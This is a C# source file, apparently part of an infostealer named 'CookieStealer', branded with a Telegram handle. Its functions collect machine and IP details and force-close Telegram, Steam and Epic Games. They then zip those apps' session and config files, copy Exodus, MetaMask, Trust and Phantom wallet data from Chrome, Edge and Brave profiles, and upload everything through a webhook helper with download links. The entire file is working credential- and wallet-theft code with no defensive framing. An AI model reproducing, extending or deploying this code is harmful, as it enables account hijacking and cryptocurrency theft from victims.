using System.Diagnostics;
using System.IO.Compression;
using System.Text.RegularExpressions;

namespace CookieStealer;

public static class AppStealers
{
    public static void CollectSystemInfo()
    {
        Console.WriteLine("[*] Collecting system information...");
        string pcName = Environment.MachineName;
        string osName = $"{Environment.OSVersion.Platform} {Environment.OSVersion.Version}";
        string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
        string hwid = "Unknown HWID";

        try
        {
            var si = new ProcessStartInfo("wmic", "baseboard get serialnumber")
            {
                RedirectStandardOutput = true, UseShellExecute = false,
                CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden
            };
            var p = Process.Start(si);
            if (p != null)
            {
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                var lines = output.Split('\n', StringSplitOptions.RemoveEmptyEntries);
                if (lines.Length > 1 && !string.IsNullOrWhiteSpace(lines[1]))
                    hwid = lines[1].Trim();
            }
        }
        catch { }

        var ipInfo = WebhookHelper.GetPublicIpInfo();

        var payload = new
        {
            embeds = new[] { new {
                title = $"⚓ Light New report | {pcName}",
                color = 0x808080,
                fields = new[] { new {
                    name = "\u200b",
                    value = "```" +
                        $"PC Name   →  {pcName}\n" +
                        $"IP        →  {ipInfo.GetValueOrDefault("query", "N/A")}\n" +
                        $"Location  →  {ipInfo.GetValueOrDefault("city", "N/A")}, {ipInfo.GetValueOrDefault("country", "N/A")}\n" +
                        $"ORG       →  {ipInfo.GetValueOrDefault("isp", "N/A")}\n" +
                        $"HWID      →  {hwid}" + "```",
                    inline = false
                }},
                timestamp = DateTime.UtcNow.ToString("o"),
                footer = new { text = "yigit | t.me/layer7730", icon_url = "https://i.imgur.com/pBQ2Npk.jpeg" }
            }}
        };
        WebhookHelper.SendWebhook(payload);
    }

    public static void ZipDirectory(string sourcePath, string zipPath)
    {
        using var zip = ZipFile.Open(zipPath, ZipArchiveMode.Create);
        foreach (var file in Directory.EnumerateFiles(sourcePath, "*", SearchOption.AllDirectories))
        {
            if (file.ToLower().Contains("media_cache")) continue;
            string entryName = Path.GetRelativePath(sourcePath, file);
            zip.CreateEntryFromFile(file, entryName, CompressionLevel.Optimal);
        }
    }

    public static void StealTelegram()
    {
        Console.WriteLine("[*] Stealing Telegram sessions...");
        try
        {
            string? appdata = Environment.GetEnvironmentVariable("APPDATA");
            if (appdata == null) return;
            string tdataPath = Path.Combine(appdata, "Telegram Desktop", "tdata");
            if (!Directory.Exists(tdataPath)) { Console.WriteLine("[-] Telegram tdata not found."); return; }

            try { Process.Start(new ProcessStartInfo("taskkill", "/F /IM Telegram.exe") { CreateNoWindow = true, UseShellExecute = false })?.WaitForExit(); } catch { }
            Thread.Sleep(1000);

            string tempZip = Path.Combine(Path.GetTempPath(), $"Telegram_{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}.zip");
            ZipDirectory(tdataPath, tempZip);

            if (File.Exists(tempZip) && new FileInfo(tempZip).Length > 0)
            {
                Console.WriteLine("[+] Telegram session zipped. Uploading...");
                string? link = WebhookHelper.UploadFile(tempZip);
                if (link != null)
                {
                    WebhookHelper.SendWebhook(new {
                        embeds = new[] { new {
                            title = $"⚓️ yigit (Telegram Session) - {Environment.UserName}",
                            description = $"📎 Download: [CLICK!]({link})",
                            color = 0x808080,
                            footer = new { text = "yigit | t.me/layer7730" }
                        }}
                    });
                }
                try { File.Delete(tempZip); } catch { }
            }
        }
        catch (Exception e) { Console.WriteLine($"[-] Telegram stealing failed: {e.Message}"); }
    }

    public static void StealWallets()
    {
        try
        {
            string? local = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            string? roaming = Environment.GetEnvironmentVariable("APPDATA");
            if (local == null || roaming == null) return;

            var walletPaths = new Dictionary<string, string>
            {
                ["Exodus"] = Path.Combine(roaming, "Exodus", "exodus.wallet"),
                ["Trust"] = @"\Local Extension Settings\egjidjbpglichdcondbcbdnbeeppgdph",
                ["Metamask"] = @"\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
                ["Phantom"] = @"\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa"
            };

            var foundWallets = new List<string>();
            string tempDir = Path.Combine(Path.GetTempPath(), $"Wallets_{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}");
            Directory.CreateDirectory(tempDir);

            if (Directory.Exists(walletPaths["Exodus"]))
            {
                CopyDirectory(walletPaths["Exodus"], Path.Combine(tempDir, "Exodus"));
                foundWallets.Add("Exodus");
            }

            var browserRoots = new Dictionary<string, string>
            {
                ["Chrome"] = Path.Combine(local, "Google", "Chrome", "User Data"),
                ["Edge"] = Path.Combine(local, "Microsoft", "Edge", "User Data"),
                ["Brave"] = Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data")
            };

            foreach (var (bName, bRoot) in browserRoots)
            {
                if (!Directory.Exists(bRoot)) continue;
                foreach (string profile in new[] { "Default", "Profile 1", "Profile 2", "Profile 3" })
                {
                    string pPath = Path.Combine(bRoot, profile);
                    if (!Directory.Exists(pPath)) continue;
                    foreach (var (wName, wRel) in walletPaths)
                    {
                        if (wName == "Exodus") continue;
                        string wFull = pPath + wRel;
                        if (Directory.Exists(wFull))
                        {
                            CopyDirectory(wFull, Path.Combine(tempDir, $"{bName}_{profile}_{wName}"));
                            foundWallets.Add($"{bName} {wName}");
                        }
                    }
                }
            }

            if (foundWallets.Count > 0)
            {
                string zipPath = tempDir + ".zip";
                ZipDirectory(tempDir, zipPath);
                string? link = WebhookHelper.UploadFile(zipPath);
                if (link != null)
                {
                    WebhookHelper.SendWebhook(new {
                        embeds = new[] { new {
                            title = $"⚓️ yigit - Wallets Found ({Environment.UserName})",
                            description = $"Download: [CLICK!]({link})\n\nFound: {string.Join(", ", foundWallets)}",
                            color = 0x808080,
                            footer = new { text = "yigit | t.me/layer7730" }
                        }}
                    });
                }
                try { File.Delete(zipPath); } catch { }
            }
            try { Directory.Delete(tempDir, true); } catch { }
        }
        catch { }
    }

    public static void StealSteam()
    {
        try
        {
            string steamPath = @"C:\Program Files (x86)\Steam\config";
            if (!Directory.Exists(steamPath)) return;
            try { Process.Start(new ProcessStartInfo("taskkill", "/F /IM Steam.exe") { CreateNoWindow = true, UseShellExecute = false })?.WaitForExit(); } catch { }

            string tempZip = Path.Combine(Path.GetTempPath(), $"Steam_{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}.zip");
            ZipDirectory(steamPath, tempZip);

            string? link = WebhookHelper.UploadFile(tempZip);
            if (link != null)
            {
                string accList = "Unknown";
                string vdfPath = Path.Combine(steamPath, "loginusers.vdf");
                if (File.Exists(vdfPath))
                {
                    string content = File.ReadAllText(vdfPath);
                    var matches = Regex.Matches(content, @"7656\d{13}");
                    if (matches.Count > 0) accList = string.Join(", ", matches.Select(m => m.Value));
                }
                WebhookHelper.SendWebhook(new {
                    embeds = new[] { new {
                        title = $"🏴‍☠️ yigit (Steam Session) - {Environment.UserName}",
                        description = $"Download: [CLICK!]({link})\nAccounts: {accList}",
                        color = 0x808080,
                        footer = new { text = "yigit | t.me/layer7730" }
                    }}
                });
            }
            try { File.Delete(tempZip); } catch { }
        }
        catch { }
    }

    public static void StealEpic()
    {
        try
        {
            string? local = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            if (local == null) return;
            string epicPath = Path.Combine(local, "EpicGamesLauncher", "Saved", "Config", "Windows");
            if (!Directory.Exists(epicPath)) return;
            try { Process.Start(new ProcessStartInfo("taskkill", "/F /IM EpicGamesLauncher.exe") { CreateNoWindow = true, UseShellExecute = false })?.WaitForExit(); } catch { }

            string tempZip = Path.Combine(Path.GetTempPath(), $"Epic_{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}.zip");
            ZipDirectory(epicPath, tempZip);

            string? link = WebhookHelper.UploadFile(tempZip);
            if (link != null)
            {
                WebhookHelper.SendWebhook(new {
                    embeds = new[] { new {
                        title = $"🏴‍☠️ Yigit (EpicGames Data) - {Environment.UserName}",
                        description = $"Download: [CLICK!]({link})",
                        color = 0x808080,
                        footer = new { text = "yigit | t.me/layer7730" }
                    }}
                });
            }
            try { File.Delete(tempZip); } catch { }
        }
        catch { }
    }

    private static void CopyDirectory(string sourceDir, string destDir)
    {
        Directory.CreateDirectory(destDir);
        foreach (var file in Directory.GetFiles(sourceDir))
            File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), true);
        foreach (var dir in Directory.GetDirectories(sourceDir))
            CopyDirectory(dir, Path.Combine(destDir, Path.GetFileName(dir)));
    }
}
